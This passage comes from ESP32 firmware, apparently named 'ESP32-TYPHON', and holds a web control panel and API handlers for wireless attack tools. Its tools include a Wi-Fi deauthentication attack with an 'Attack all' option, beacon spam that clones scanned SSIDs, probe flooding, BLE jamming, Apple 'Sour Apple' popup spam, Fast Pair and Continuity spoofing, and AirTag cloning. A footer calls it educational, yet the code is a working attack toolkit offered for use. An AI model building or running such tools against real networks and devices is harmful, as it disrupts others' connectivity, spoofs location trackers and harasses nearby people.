    <div class="tile" onclick="go('ble-sniff')"><div class="ico">👁</div><h2>BLE Sniffer</h2><p>Continuous scan</p></div>
    <div class="tile" onclick="go('ble-spoof')"><div class="ico">🎭</div><h2>BLE Spoofer</h2><p>Fake names</p></div>
    <div class="tile" onclick="go('ble-sour')"><div class="ico">🍎</div><h2>Sour Apple</h2><p>Pick model / action</p></div>
    <div class="tile" onclick="go('ble-jam')"><div class="ico">📻</div><h2>BLE Jammer</h2><p>Noise flood</p></div>
    <div class="tile" onclick="go('ble-airdet')"><div class="ico">📍</div><h2>AirTag Detector</h2><p>Find nearby AirTags</p></div>
    <div class="tile" onclick="go('ble-air')"><div class="ico">🏷</div><h2>AirTag Spoofer</h2><p>Clone / spam payloads</p></div>
  </div>
  <button class="danger stopall" onclick="act('stop_all')">Stop all tools</button>
</div>

<div id="v-wifi-scan" class="view">
  <div class="nav"><button class="back" onclick="go('wifi')">← Wi‑Fi</button><h2 style="font-size:1rem">Wi‑Fi Scanner</h2></div>
  <div class="card">
    <h3>Scanner</h3>
    <div class="row"><button id="btnWifiScan" onclick="act('wifi_scan')">Start scan</button></div>
    <div class="bar"><i id="wscanBar"></i></div>
    <div class="msg" id="wscanMsg">Previous results stay until a new scan finishes</div>
    <div class="list" id="wifiList"></div>
  </div>
</div>

<div id="v-wifi-pm" class="view">
  <div class="nav"><button class="back" onclick="go('wifi')">← Wi‑Fi</button><h2 style="font-size:1rem">Packet Monitor</h2></div>
  <div class="card">
    <h3>Monitor</h3>
    <label class="lbl">Channel (1–13)</label>
    <input type="number" id="pmCh" min="1" max="13" value="1">
    <label class="lbl"><input type="checkbox" id="pmHop"> Hop channels</label>
    <div class="row"><button id="btnPm" onclick="toggle('pm')">Start</button></div>
    <div class="msg">Pkts <b id="pmTotal">0</b> · CH <b id="pmChLive">1</b> · RSSI <b id="pmRssi">—</b></div>
    <div class="msg">MGMT <b id="pmMgmt">0</b> · DATA <b id="pmData">0</b> · CTRL <b id="pmCtrl">0</b> · Deauth/Disassoc <b id="pmDeauth">0</b></div>
  </div>
</div>

<div id="v-wifi-beacon" class="view">
  <div class="nav"><button class="back" onclick="go('wifi')">← Wi‑Fi</button><h2 style="font-size:1rem">Beacon Spammer</h2></div>
  <div class="card">
    <h3>Beacon</h3>
    <label class="lbl">Mode</label>
    <select id="beaconMode" onchange="onBeaconMode()">
      <option value="0">Funny SSID list</option>
      <option value="1">Clone scanned SSIDs</option>
      <option value="2">Add list of SSIDs</option>
    </select>
    <div id="customSsidBox">
      <label class="lbl">How many SSIDs (1–10)</label>
      <select id="ssidCount" onchange="buildSsidInputs()">
        <option>1</option><option>2</option><option>3</option><option>4</option><option>5</option>
        <option>6</option><option>7</option><option>8</option><option>9</option><option>10</option>
      </select>
      <div id="ssidInputs" style="margin-top:8px"></div>
    </div>
    <div class="row"><button id="btnBeacon" class="attack" onclick="toggle('beacon')">Start</button></div>
    <div class="msg">Sent: <b id="beaconSent">0</b></div>
  </div>
</div>

<div id="v-wifi-deauth" class="view">
  <div class="nav"><button class="back" onclick="go('wifi')">← Wi‑Fi</button><h2 style="font-size:1rem">Deauth Attack</h2></div>
  <div class="card">
    <div class="targetBar empty" id="deauthTargetBar"><div class="lbl">Selected target</div><div class="val" id="deauthTargetLabel">None — tap a network below</div></div>
    <div class="msg">Scan Wi‑Fi first, then tap a network</div>
    <div class="list" id="deauthList"></div>
    <div class="row">
      <button id="btnDeauth" class="attack" onclick="toggle('deauth')">Start</button>
      <button class="sec" onclick="act('deauth_start',{target:-1})">Attack all</button>
    </div>
    <div class="msg">Sent: <b id="deauthSent">0</b></div>
  </div>
</div>

<div id="v-wifi-det" class="view">
  <div class="nav"><button class="back" onclick="go('wifi')">← Wi‑Fi</button><h2 style="font-size:1rem">Deauth Detector</h2></div>
  <div class="card">
    <h3>Detector</h3>
    <div class="row"><button id="btnDet" onclick="toggle('det')">Start</button></div>
    <div class="msg">Detected frames: <b id="detCount">0</b></div>
  </div>
</div>

<div id="v-wifi-probe" class="view">
  <div class="nav"><button class="back" onclick="go('wifi')">← Wi‑Fi</button><h2 style="font-size:1rem">Probe Flood</h2></div>
  <div class="card">
    <div class="targetBar empty" id="probeTargetBar"><div class="lbl">Selected target</div><div class="val" id="probeTargetLabel">None — tap a network below</div></div>
    <div class="msg">Scan Wi‑Fi first, then tap a network to stress-test</div>
    <div class="list" id="probeList"></div>
    <div class="row"><button id="btnProbe" class="attack" onclick="toggle('probe')">Start</button></div>
    <div class="msg">Sent: <b id="probeSent">0</b></div>
  </div>
</div>

<div id="v-ble-scan" class="view">
  <div class="nav"><button class="back" onclick="go('ble')">← Bluetooth</button><h2 style="font-size:1rem">BLE Scanner</h2></div>
  <div class="card">
    <h3>Scan</h3>
    <div class="row"><button id="btnBleScan" onclick="act('ble_scan')">Start scan</button></div>
    <div class="bar"><i id="bscanBar"></i></div>
    <div class="list" id="bleList"></div>
  </div>
</div>

<div id="v-ble-sniff" class="view">
  <div class="nav"><button class="back" onclick="go('ble')">← Bluetooth</button><h2 style="font-size:1rem">BLE Sniffer</h2></div>
  <div class="card">
    <h3>Sniffer</h3>
    <div class="row"><button id="btnSniff" onclick="toggle('sniff')">Start</button></div>
    <div class="msg">Suspicious <b id="bleSus">0</b> · Flood alerts <b id="bleFlood">0</b></div>
    <div class="list" id="bleList2"></div>
  </div>
</div>

<div id="v-ble-spoof" class="view">
  <div class="nav"><button class="back" onclick="go('ble')">← Bluetooth</button><h2 style="font-size:1rem">BLE Spoofer</h2></div>
  <div class="card">
    <h3>Advertise</h3>
    <label class="lbl">Mode</label>
    <select id="spoofMode">
      <option value="0">Apple Continuity (raw)</option>
      <option value="1">Samsung Galaxy Watch</option>
      <option value="2">Google Fast Pair</option>
      <option value="3">Rotating name list</option>
      <option value="4">Clone scanned BLE names</option>
      <option value="5">Custom name</option>
    </select>
    <label class="lbl">Custom name (mode 5)</label>
    <input id="spoofName" placeholder="My Device" maxlength="28">
    <label class="lbl">TX power (0–9)</label>
    <input type="number" id="spoofPower" min="0" max="9" value="9">
    <label class="lbl">ADV interval (16–160)</label>
    <input type="number" id="spoofInterval" min="16" max="160" value="32">
    <div class="row"><button id="btnSpoof" class="attack" onclick="toggle('spoof')">Start</button></div>
  </div>
</div>

<div id="v-ble-sour" class="view">
  <div class="nav"><button class="back" onclick="go('ble')">← Bluetooth</button><h2 style="font-size:1rem">Sour Apple</h2></div>
  <div class="card">
    <div class="targetBar" id="sourTargetBar"><div class="lbl">Selected target</div><div class="val" id="sourTargetLabel">Random Mix</div></div>
    <label class="lbl">Model / action</label>
    <select id="sourIdx" onchange="onSourChange()"><option value="-1">Random Mix</option></select>
    <div class="row"><button id="btnSour" class="attack" onclick="toggle('sour')">Start</button></div>
    <div class="msg">Sent: <b id="sourSent">0</b> · Active: <b id="sourName">—</b></div>
  </div>
</div>

<div id="v-ble-jam" class="view">
  <div class="nav"><button class="back" onclick="go('ble')">← Bluetooth</button><h2 style="font-size:1rem">BLE Jammer</h2></div>
  <div class="card">
    <h3>Noise</h3>
    <div class="row"><button id="btnJam" class="attack" onclick="toggle('jam')">Start</button></div>
    <div class="msg">Noise packets: <b id="jamCount">0</b></div>
  </div>
</div>

<div id="v-ble-airdet" class="view">
  <div class="nav"><button class="back" onclick="go('ble')">← Bluetooth</button><h2 style="font-size:1rem">AirTag Detector</h2></div>
  <div class="card">
    <div class="targetBar empty" id="airDetTargetBar"><div class="lbl">Selected target</div><div class="val" id="airSelectedLabel">None — tap a device below</div></div>
    <div class="row"><button id="btnAirDet" onclick="toggleAirDet()">Start scan</button></div>
    <div class="msg">Found: <b id="airCount">0</b></div>
    <div class="list" id="airList"></div>
    <div class="row" style="margin-top:10px">
      <button class="attack" id="btnAirSpoofSel" onclick="spoofSelectedAir()">Spoof selected</button>
      <button class="sec" onclick="go('ble-air')">Open spoofer →</button>
    </div>
  </div>
</div>

<div id="v-ble-air" class="view">
  <div class="nav"><button class="back" onclick="go('ble')">← Bluetooth</button><h2 style="font-size:1rem">AirTag Spoofer</h2></div>
  <div class="card">
    <div class="targetBar" id="airSpoofTargetBar"><div class="lbl">Selected target</div><div class="val" id="airSpoofTargetLabel">Spam all / synthetic</div></div>
    <div class="msg">Use Detector first for real payloads. Synthetic Find My ADV if list is empty.</div>
    <label class="lbl">Target</label>
    <select id="airTarget" onchange="onAirTargetChange()"><option value="-1">Spam all / synthetic</option></select>
    <div class="row">
      <button id="btnAir" class="attack" onclick="toggle('air')">Start</button>
      <button class="sec" onclick="go('ble-airdet')">← Detector</button>
    </div>
    <div class="msg">Sent: <b id="airSent">0</b> · Captured: <b id="airCount2">0</b></div>
  </div>
</div>

<div class="footer">Hold BOOT 2s to exit web mode · Educational use only</div>
</div>
<script>
let deauthTarget=-1, appleReady=false, S={};
function go(id){document.querySelectorAll('.view').forEach(v=>v.classList.remove('active'));const e=document.getElementById('v-'+id);if(e)e.classList.add('active');}
function onBeaconMode(){
  const m=document.getElementById('beaconMode').value;
  document.getElementById('customSsidBox').classList.toggle('show', m==='2');
  if(m==='2') buildSsidInputs();
}
function buildSsidInputs(){
  const n=parseInt(document.getElementById('ssidCount').value)||1;
  const box=document.getElementById('ssidInputs');
  let h='';
  for(let i=0;i<n;i++) h+=`<div class="ssidRow"><input id="ssid${i}" maxlength="32" placeholder="SSID ${i+1}"></div>`;
  box.innerHTML=h;
}
function esc(s){return String(s||'').replace(/[<>&]/g,c=>({'<':'&lt;','>':'&gt;','&':'&amp;'}[c]));}
function rssiClass(r){if(r>=-55)return'rssi-g';if(r>=-70)return'rssi-y';if(r>=-80)return'rssi-o';return'rssi-r';}
function wifiItem(n,i,clickable){
  const open=!!n.open;
  const enc=esc(n.enc|| (open?'Open':'Secured'));
  const dot=open?'<span class="dot" title="Open network"></span>':'';
  const onclick=clickable?`onclick="pickDeauth(${i})"`:'';
  const active=(clickable&&deauthTarget===i)?' active':'';
  return `<div class="item${active}" ${onclick}>
    <div>${dot}<b>${esc(n.ssid)}</b><span class="enc">${enc}</span>
      <div class="meta">${esc(n.bssid||'')} · CH ${n.ch}</div></div>
    <div class="${rssiClass(n.rssi)}">${n.rssi} dBm</div></div>`;
}
function renderWifi(list){
  const empty='<div class="item"><span>No networks yet — run a scan</span></div>';
  if(!list||!list.length){document.getElementById('wifiList').innerHTML=empty;document.getElementById('deauthList').innerHTML=empty;return;}
  document.getElementById('wifiList').innerHTML=list.map((n,i)=>wifiItem(n,i,false)).join('');
  document.getElementById('deauthList').innerHTML=list.map((n,i)=>wifiItem(n,i,true)).join('');
}
function renderBle(list){
  const html=(!list||!list.length)?'<div class="item"><span>No devices yet — run a scan</span></div>':
    list.map(n=>{
      const tags=(n.sus?' ⚠':'')+(n.rand?' rnd':'');
      const hits=n.hits?(' · '+n.hits+' hits'):'';
      return `<div class="item"><div><b>${esc(n.name)}</b>${n.sus?'<span class="enc" style="color:var(--err)">SUS</span>':''}
        <div class="meta">${esc(n.addr||'')}${hits}${tags}</div></div>
        <div class="${rssiClass(n.rssi)}">${n.rssi} dBm</div></div>`;
    }).join('');
  document.getElementById('bleList').innerHTML=html;
  document.getElementById('bleList2').innerHTML=html;
}
function setTargetBar(barId,labelId,text,isEmpty){
  const bar=document.getElementById(barId);
  const lab=document.getElementById(labelId);
  if(lab) lab.textContent=text||'None';
  if(bar) bar.classList.toggle('empty', !!isEmpty);
}
function pickDeauth(i){
  deauthTarget=i;
  renderWifi(S.wifi||[]);
  const list=S.wifi||[];
  if(list[i]) setTargetBar('deauthTargetBar','deauthTargetLabel', list[i].ssid+' · CH'+list[i].ch+' · '+(list[i].bssid||''), false);
  else setTargetBar('deauthTargetBar','deauthTargetLabel','None — tap a network below', true);
}
let probeTarget=-1;
function pickProbe(i){
  probeTarget=i;
  renderProbe(S.wifi||[]);
  const list=S.wifi||[];
  if(list[i]) setTargetBar('probeTargetBar','probeTargetLabel', list[i].ssid+' · CH'+list[i].ch+' · '+(list[i].bssid||''), false);
  else setTargetBar('probeTargetBar','probeTargetLabel','None — tap a network below', true);
}
function renderProbe(list){
  const el=document.getElementById('probeList');
  if(!el) return;
  const empty='<div class="item"><span>No networks — run Wi‑Fi scan first</span></div>';
  if(!list||!list.length){el.innerHTML=empty;return;}
  el.innerHTML=list.map((n,i)=>{
    const act=(probeTarget===i)?' active':'';
    return `<div class="item${act}" onclick="pickProbe(${i})">
      <div><b>${esc(n.ssid)}</b><span class="enc">${esc(n.enc||'')}</span>
        <div class="meta">${esc(n.bssid||'')} · CH ${n.ch}</div></div>
      <div class="${rssiClass(n.rssi)}">${n.rssi} dBm</div></div>`;
  }).join('');
}
function fillApple(names){if(appleReady||!names)return;const sel=document.getElementById('sourIdx');names.forEach((n,i)=>{const o=document.createElement('option');o.value=i;o.textContent=n;sel.appendChild(o);});appleReady=true;}
function setToggle(id,on){const b=document.getElementById(id);if(!b)return;b.textContent=on?'Stop':'Start';b.classList.toggle('on',!!on);}
function setMode(m){
  const el=document.getElementById('modePill');
  const map={idle:['Idle','idle'],scanning:['Scanning','scanning'],attacking:['Attacking','attacking'],defending:['Defending','defending']};
  const x=map[m]||map.idle; el.textContent=x[0]; el.className='mode '+x[1];
}
function apply(s){
  S=s||{};
  setMode(s.mode||'idle');
  document.getElementById('temp').textContent=(s.temp!=null)?Number(s.temp).toFixed(1):'—';
  setToggle('btnPm',s.pm); setToggle('btnBeacon',s.beacon); setToggle('btnDeauth',s.deauth);
  setToggle('btnDet',s.det); setToggle('btnProbe',s.probe); setToggle('btnSpoof',s.spoof);
  setToggle('btnSour',s.sour); setToggle('btnJam',s.jam); setToggle('btnAir',s.air); setToggle('btnSniff',s.sniff);
  document.getElementById('wscanBar').style.width=s.wifiScanning?'75%':'0%';
  document.getElementById('bscanBar').style.width=s.bleScanning?'75%':'0%';
  document.getElementById('btnWifiScan').textContent=s.wifiScanning?'Scanning…':'Start scan';
  document.getElementById('btnWifiScan').disabled=!!s.wifiScanning;
  document.getElementById('btnBleScan').textContent=s.bleScanning?'Scanning…':'Start scan';
  document.getElementById('btnBleScan').disabled=!!s.bleScanning;
  document.getElementById('pmTotal').textContent=s.pmTotal||0;
  document.getElementById('pmChLive').textContent=s.pmCh||1;
  const pr=document.getElementById('pmRssi'); if(pr) pr.textContent=(s.pmRssi!=null)?s.pmRssi:'—';
  const a=['pmMgmt','pmData','pmCtrl','pmDeauth','bleSus','bleFlood'];
  a.forEach(k=>{const e=document.getElementById(k); if(e) e.textContent=s[k]||0;});
  document.getElementById('beaconSent').textContent=s.beaconSent||0;
  document.getElementById('deauthSent').textContent=s.deauthSent||0;
  document.getElementById('detCount').textContent=s.detCount||0;
  document.getElementById('probeSent').textContent=s.probeSent||0;
  document.getElementById('jamCount').textContent=s.jamCount||0;
  document.getElementById('airSent').textContent=s.airSent||0;
  const ac=s.airCount||0;
  const ace=document.getElementById('airCount'); if(ace) ace.textContent=ac;
  const ac2=document.getElementById('airCount2'); if(ac2) ac2.textContent=ac;
  setToggle('btnAirDet', s.airDet);
  setToggle('btnAir', s.air);
  renderAir(s.airtags);
  fillAirTargets(s.airtags);
  if(airSelected>=0 && s.airtags && s.airtags[airSelected]){
    const t=(s.airtags[airSelected].name||'AirTag')+' · '+(s.airtags[airSelected].addr||'');
    setTargetBar('airDetTargetBar','airSelectedLabel', t, false);
    setTargetBar('airSpoofTargetBar','airSpoofTargetLabel', t, false);
  }
  document.getElementById('sourSent').textContent=s.sourSent||0;
  document.getElementById('sourName').textContent=s.sourName||'—';
  document.getElementById('wscanMsg').textContent=s.wifiScanning?'Scanning… keeping previous list until done':((s.wifi&&s.wifi.length)?(s.wifi.length+' networks'):'No networks yet');
  renderWifi(s.wifi); renderProbe(s.wifi); renderBle(s.ble); fillApple(s.apple);
  if(probeTarget>=0 && s.wifi && s.wifi[probeTarget]){
    const n=s.wifi[probeTarget];
    setTargetBar('probeTargetBar','probeTargetLabel', n.ssid+' · CH'+n.ch+' · '+(n.bssid||''), false);
  }
  if(typeof deauthTarget==='number' && deauthTarget>=0 && s.wifi && s.wifi[deauthTarget]){
    const n=s.wifi[deauthTarget];
    setTargetBar('deauthTargetBar','deauthTargetLabel', n.ssid+' · CH'+n.ch+' · '+(n.bssid||''), false);
  }
  if(s.sourName) setTargetBar('sourTargetBar','sourTargetLabel', s.sourName, false);
}
async function refresh(){try{const r=await fetch('/api/status');apply(await r.json());}catch(e){}}
async function act(action,extra){
  const body=Object.assign({action},extra||{});
  if(action==='pm_start'){body.ch=parseInt(document.getElementById('pmCh').value)||1;body.hop=document.getElementById('pmHop').checked?1:0;}
  if(action==='beacon_start'){
    body.mode=parseInt(document.getElementById('beaconMode').value)||0;
    if(body.mode===2){
      const n=parseInt(document.getElementById('ssidCount').value)||1;
      const arr=[];
      for(let i=0;i<n;i++){const v=(document.getElementById('ssid'+i).value||'').trim(); if(v) arr.push(v);}
      body.list=arr.join('|');
      body.count=arr.length;
    }
  }
  if(action==='deauth_start' && body.target===undefined) body.target=deauthTarget;
  if(action==='probe_start' && body.target===undefined) body.target=probeTarget;
  if(action==='spoof_start'){body.mode=parseInt(document.getElementById('spoofMode').value)||0;body.name=document.getElementById('spoofName').value||'';body.power=parseInt(document.getElementById('spoofPower').value)||9;body.interval=parseInt(document.getElementById('spoofInterval').value)||32;}
  if(action==='sour_start') body.idx=parseInt(document.getElementById('sourIdx').value);
  try{
    const r=await fetch('/api',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)});
    const j=await r.json();
    document.getElementById('sysMsg').textContent=j.msg||'';
    if(j.status) apply(j.status);
  }catch(e){document.getElementById('sysMsg').textContent='Request failed — reconnect to ESP32-TYPHON';}
}
function toggle(tool){
  const on={pm:S.pm,beacon:S.beacon,deauth:S.deauth,det:S.det,probe:S.probe,spoof:S.spoof,sour:S.sour,jam:S.jam,air:S.air,sniff:S.sniff}[tool];
  if(tool==='probe'){
    if(on) act('probe_stop');
    else {
      if(probeTarget<0){document.getElementById('sysMsg').textContent='Select an AP from the list first';return;}
      act('probe_start',{target:probeTarget});
    }
    return;
  }
  if(tool==='air'){
    if(on) act('air_stop');
    else {
      const t=parseInt(document.getElementById('airTarget').value);
      act('air_start',{target:isNaN(t)?-1:t});
    }
    return;
  }
  if(on) act(tool+'_stop'); else act(tool+'_start');
}
let airSelected=-1;
function renderAir(list){
  const el=document.getElementById('airList');
  if(!el) return;
  if(!list||!list.length){el.innerHTML='<div class="item"><span>No AirTags yet — start detector</span></div>';return;}
  el.innerHTML=list.map((n,i)=>{
    const act=(airSelected===i)?' active':'';
    return `<div class="item${act}" onclick="pickAir(${i})"><div><b>${esc(n.name||'AirTag')}</b>
      <div class="meta">${esc(n.addr||'')} · ${n.plen||0} B payload</div></div>
      <div class="${rssiClass(n.rssi)}">${n.rssi} dBm</div></div>`;
  }).join('');
}
function pickAir(i){
  airSelected=i;
  const list=S.airtags||[];
  if(list[i]){
    const t=(list[i].name||'AirTag')+' · '+(list[i].addr||'');
    setTargetBar('airDetTargetBar','airSelectedLabel', t, false);
    setTargetBar('airSpoofTargetBar','airSpoofTargetLabel', t, false);
  } else {
    setTargetBar('airDetTargetBar','airSelectedLabel','None — tap a device below', true);
  }
  const sel=document.getElementById('airTarget');
  if(sel){sel.value=String(i); fillAirTargets(list); sel.value=String(i);}
  renderAir(list);
}
function onAirTargetChange(){
  const sel=document.getElementById('airTarget');
  if(!sel) return;
  const v=parseInt(sel.value);
  airSelected=v;
  if(v<0) setTargetBar('airSpoofTargetBar','airSpoofTargetLabel','Spam all / synthetic', false);
  else {
    const list=S.airtags||[];
    if(list[v]) setTargetBar('airSpoofTargetBar','airSpoofTargetLabel',(list[v].name||'AirTag')+' · '+(list[v].addr||''), false);
  }
}
function onSourChange(){
  const sel=document.getElementById('sourIdx');
  if(!sel) return;
  const opt=sel.options[sel.selectedIndex];
  setTargetBar('sourTargetBar','sourTargetLabel', opt?opt.text:'Random Mix', false);
}
function spoofSelectedAir(){
  if(airSelected<0){document.getElementById('sysMsg').textContent='Select an AirTag from the list first';return;}
  act('air_start',{target:airSelected});
  go('ble-air');
}
let airTargetsReady=false, airTargetsSig='';
function fillAirTargets(list){
  const sel=document.getElementById('airTarget'); if(!sel) return;
  const sig=list?(list.length+':'+(list.map(x=>x.addr).join(','))):'0';
  if(sig===airTargetsSig) return;
  airTargetsSig=sig;
  const cur=sel.value;
  sel.innerHTML='<option value="-1">Spam all / synthetic</option>';
  (list||[]).forEach((n,i)=>{const o=document.createElement('option');o.value=i;o.textContent=(n.name||'AirTag')+' '+((n.addr||'').slice(-8));sel.appendChild(o);});
  sel.value=cur;
}
function toggleAirDet(){
  if(S.airDet) act('air_det_stop'); else act('air_det_start');
}
setInterval(refresh,1500); refresh();
</script>
</body></html>
)HTML";


static float readChipTempC() {
  // Internal sensor; approximate, varies by chip/core version
  return temperatureRead();
}

static String jsonStatus() {
  String j = "{";
  bool any = pmRunning || beaconRunning || deauthRunning || detRunning ||
             probeRunning || sniffRunning || spoofRunning || sourRunning ||
             jamRunning || airTagRunning;
  const char* mode = "idle";
  if (wifiScanning || bleScanning || sniffRunning || pmRunning || airDetRunning) mode = "scanning";
  else if (detRunning) mode = "defending";
  else if (beaconRunning || deauthRunning || probeRunning || spoofRunning ||
           sourRunning || jamRunning || airSpoofRunning) mode = "attacking";
  j += "\"mode\":\""; j += mode; j += "\",";
  j += "\"any\":"; j += any ? "true," : "false,";
  j += "\"pm\":"; j += pmRunning ? "true," : "false,";
  j += "\"beacon\":"; j += beaconRunning ? "true," : "false,";
  j += "\"deauth\":"; j += deauthRunning ? "true," : "false,";
  j += "\"det\":"; j += detRunning ? "true," : "false,";
  j += "\"probe\":"; j += probeRunning ? "true," : "false,";
  j += "\"spoof\":"; j += spoofRunning ? "true," : "false,";
  j += "\"sour\":"; j += sourRunning ? "true," : "false,";
  j += "\"jam\":"; j += jamRunning ? "true," : "false,";
  j += "\"air\":"; j += airSpoofRunning ? "true," : "false,";
  j += "\"airDet\":"; j += airDetRunning ? "true," : "false,";
  j += "\"airCount\":" + String(airTagCount) + ",";
  j += "\"sniff\":"; j += sniffRunning ? "true," : "false,";
  j += "\"wifiScanning\":"; j += wifiScanning ? "true," : "false,";
  j += "\"bleScanning\":"; j += bleScanning ? "true," : "false,";
  j += "\"pmTotal\":" + String((unsigned long)pktTotal) + ",";
  j += "\"pmCh\":" + String(pmChannel) + ",";
  j += "\"pmHop\":"; j += pmHop ? "true," : "false,";
  j += "\"pmMgmt\":" + String((unsigned long)pmMgmt) + ",";
  j += "\"pmData\":" + String((unsigned long)pmData) + ",";
  j += "\"pmCtrl\":" + String((unsigned long)pmCtrl) + ",";
  j += "\"pmDeauth\":" + String((unsigned long)pmDeauthSeen) + ",";
  j += "\"pmRssi\":" + String((int)pmLastRssi) + ",";
  j += "\"bleSus\":" + String((unsigned long)bleSuspicious) + ",";
  j += "\"bleFlood\":" + String((unsigned long)bleFloodAlerts) + ",";
  j += "\"spoofPower\":" + String(spoofPower) + ",";
  j += "\"spoofInterval\":" + String(spoofInterval) + ",";
  j += "\"beaconSent\":" + String((unsigned long)beaconSent) + ",";
  j += "\"deauthSent\":" + String((unsigned long)deauthSent) + ",";
  j += "\"detCount\":" + String((unsigned long)deauthCount) + ",";
  j += "\"probeSent\":" + String((unsigned long)probeSent) + ",";
  j += "\"jamCount\":" + String((unsigned long)jamCount) + ",";
  j += "\"airSent\":" + String((unsigned long)airTagSent) + ",";
  j += "\"sourSent\":" + String((unsigned long)sourSent) + ",";
  j += "\"temp\":" + String(readChipTempC(), 1) + ",";
  j += "\"uptime\":" + String((unsigned long)millis()) + ",";
  j += "\"clients\":" + String((unsigned)WiFi.softAPgetStationNum()) + ",";
  j += "\"heap\":" + String((unsigned long)ESP.getFreeHeap()) + ",";
  {
    String sn = "—";
    if (sourRunning) {
      if (sourSelected < 0) sn = "Random Mix";
      else if (sourSelected < APPLE_LIST_COUNT) sn = appleList[sourSelected].name;
    }
    sn.replace("\"", "'");
    j += "\"sourName\":\"" + sn + "\",";
  }
  j += "\"apple\":[";
  for (int i = 0; i < APPLE_LIST_COUNT; i++) {
    if (i) j += ",";
    String n = appleList[i].name; n.replace("\"", "'");
    j += "\"" + n + "\"";
  }
  j += "],\"wifi\":[";
  for (int i = 0; i < wifiCount; i++) {
    if (i) j += ",";
    String s = wifiNets[i].ssid; s.replace("\"", "'");
    char bssid[18];
    snprintf(bssid, sizeof(bssid), "%02X:%02X:%02X:%02X:%02X:%02X",
             wifiNets[i].bssid[0], wifiNets[i].bssid[1], wifiNets[i].bssid[2],
             wifiNets[i].bssid[3], wifiNets[i].bssid[4], wifiNets[i].bssid[5]);
    const char* encStr = "Open";
    switch (wifiNets[i].enc) {
      case WIFI_AUTH_OPEN: encStr = "Open"; break;
      case WIFI_AUTH_WEP: encStr = "WEP"; break;
      case WIFI_AUTH_WPA_PSK: encStr = "WPA"; break;
      case WIFI_AUTH_WPA2_PSK: encStr = "WPA2"; break;
      case WIFI_AUTH_WPA_WPA2_PSK: encStr = "WPA/WPA2"; break;
      case WIFI_AUTH_WPA2_ENTERPRISE: encStr = "WPA2-E"; break;
      case WIFI_AUTH_WPA3_PSK: encStr = "WPA3"; break;
      case WIFI_AUTH_WPA2_WPA3_PSK: encStr = "WPA2/WPA3"; break;
      default: encStr = "Secured"; break;
    }
    j += "{\"ssid\":\"" + s + "\",\"rssi\":" + String(wifiNets[i].rssi) +
         ",\"ch\":" + String(wifiNets[i].ch) + ",\"bssid\":\"" + String(bssid) +
         "\",\"enc\":\"" + String(encStr) + "\",\"open\":" +
         ((wifiNets[i].enc == WIFI_AUTH_OPEN) ? "true" : "false") + "}";
  }
  j += "],\"ble\":[";
  for (int i = 0; i < bleCount; i++) {
    if (i) j += ",";
    String n = bleDevs[i].name; n.replace("\"", "'");
    String a = bleDevs[i].addr; a.replace("\"", "'");
    j += "{\"name\":\"" + n + "\",\"addr\":\"" + a + "\",\"rssi\":" + String(bleDevs[i].rssi) +
         ",\"hits\":" + String((unsigned long)bleDevs[i].hits) +
         ",\"sus\":" + String(bleDevs[i].suspicious ? "true" : "false") +
         ",\"rand\":" + String(bleDevs[i].randomized ? "true" : "false") + "}";
  }
  j += "],\"airtags\":[";
  for (int i = 0; i < airTagCount; i++) {
    if (i) j += ",";
    String nm = airTags[i].name; nm.replace("\"", "'");
    String ad = airTags[i].addr; ad.replace("\"", "'");
    j += "{\"name\":\"" + nm + "\",\"addr\":\"" + ad +
         "\",\"rssi\":" + String((int)airTags[i].rssi) +
         ",\"plen\":" + String(airTags[i].payloadLen) + "}";
  }
  j += "]}";
  return j;
}

static void handleWebRoot() { webServer.send_P(200, "text/html", WEB_PAGE); }
static void handleWebStatus() { webServer.send(200, "application/json", jsonStatus()); }

static void handleWebApi() {
  String body = webServer.arg("plain");
  String action;
  int mode = 0, target = -1, ch = 1, idx = -1;
  String customName;

  int ai = body.indexOf("\"action\"");
  if (ai >= 0) {
    int q1 = body.indexOf('"', ai + 8);
    int q2 = body.indexOf('"', q1 + 1);
    if (q1 >= 0 && q2 > q1) action = body.substring(q1 + 1, q2);
  }
  auto parseIntAfter = [&](const char* key, int defv) -> int {
    int k = body.indexOf(key);
    if (k < 0) return defv;
    int c = k + (int)strlen(key);
    while (c < (int)body.length() && (body[c] < '0' || body[c] > '9') && body[c] != '-') c++;
    return (int)body.substring(c).toInt();
  };
  mode = parseIntAfter("\"mode\"", 0);
  target = parseIntAfter("\"target\"", -1);
  ch = parseIntAfter("\"ch\"", 1);
  idx = parseIntAfter("\"idx\"", -1);
  if (ch < 1 || ch > 13) ch = 1;
  {
    int ni = body.indexOf("\"name\"");
    if (ni >= 0) {
      int q1 = body.indexOf('"', ni + 6);
      int q2 = body.indexOf('"', q1 + 1);
      if (q1 >= 0 && q2 > q1) customName = body.substring(q1 + 1, q2);
    }
  }

  String msg = "OK";
  if (action == "stop_all") { stopAllTools(); msg = "All tools stopped"; }
  else if (action == "exit_web") { webExitRequested = true; msg = "Exiting web mode"; }
  else if (action == "wifi_scan") {
    if (webMode) {
      WiFi.mode(WIFI_AP_STA);
      WiFi.softAP("ESP32-TYPHON", "rgisking");
      delay(40);
    }
    wifiScanStart();
    msg = wifiScanning ? "Wi-Fi scan started" : "Scan failed to start";
  }
  else if (action == "pm_start") { stopAllTools(); pmChannel = ch; pmHop = (body.indexOf("\"hop\":1") >= 0 || body.indexOf("\"hop\": 1") >= 0); pmStart(); msg = String("Packet monitor CH") + String(ch) + (pmHop ? " (hop)" : ""); }
  else if (action == "pm_stop") { pmStop(); msg = "PM stopped"; }
  else if (action == "beacon_start") {
    stopAllTools();
    beaconMode = (uint8_t)mode;
    if (beaconMode == 2) {
      customBeaconCount = 0;
      customBeaconIdx = 0;
      int li = body.indexOf("\"list\"");
      String listStr;
      if (li >= 0) {
        int q1 = body.indexOf('"', li + 6);
        int q2 = body.indexOf('"', q1 + 1);
        if (q1 >= 0 && q2 > q1) listStr = body.substring(q1 + 1, q2);
      }
      int start = 0;
      while (start < (int)listStr.length() && customBeaconCount < 10) {
        int pipe = listStr.indexOf('|', start);
        String part = (pipe < 0) ? listStr.substring(start) : listStr.substring(start, pipe);
        part.trim();
        if (part.length() > 0) {
          if (part.length() > 32) part = part.substring(0, 32);
          strncpy(customBeaconSSIDs[customBeaconCount], part.c_str(), 32);
          customBeaconSSIDs[customBeaconCount][32] = 0;
          customBeaconCount++;
        }
        if (pipe < 0) break;
        start = pipe + 1;
      }
      if (customBeaconCount == 0) {
        msg = "Add at least one SSID";
        webServer.send(200, "application/json",
          String("{\"msg\":\"") + msg + "\",\"status\":" + jsonStatus() + "}");
        return;
      }
    }
    beaconStart();
    msg = "Beacon started";
  }
